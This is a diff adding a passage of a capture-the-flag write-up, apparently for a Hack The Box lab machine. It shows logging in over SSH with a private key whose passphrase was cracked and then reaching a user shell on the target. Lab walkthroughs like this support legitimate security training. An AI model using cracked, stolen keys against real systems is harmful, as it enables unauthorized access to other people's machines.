@@ -163,3 +163,36 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
+After cracking the passphrase we can then attempt login via ssh using the key.
+
+```
+┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/FactsHTB/CVE-2025-2304]
+└─# ssh -i ./id_ed25519 trivia@facts.htb
+Enter passphrase for key './id_ed25519': 
+Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
+Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Apr 16 02:20:14 PM UTC 2026
+
+  System load:           0.13
+  Usage of /:            72.1% of 7.28GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             222
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.244.96
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:2150
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+trivia@facts:~$ 
+```
